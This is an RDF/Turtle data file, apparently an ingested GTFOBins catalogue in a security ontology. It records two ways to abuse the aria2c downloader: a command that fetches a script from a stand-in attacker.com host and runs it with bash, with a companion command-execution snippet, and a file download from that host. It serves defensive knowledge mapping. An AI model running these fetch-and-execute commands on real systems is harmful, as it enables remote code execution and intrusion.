mknd:command_aria2c-command a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "aria2c-command" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID." ;
    d3f:uses mknd:executable_aria2c ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_aria2c ;
    mknd:provides mknd:function_command ;
    mknd:value """COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x
""",
        "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa" .

mknd:command_aria2c-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "aria2c-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed." ;
    d3f:uses mknd:executable_aria2c ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_aria2c ;
    mknd:provides mknd:function_file-download ;
    mknd:value """URL=http://attacker.com/file_to_get
LFILE=file_to_save
aria2c -o "$LFILE" "$URL"
""" .

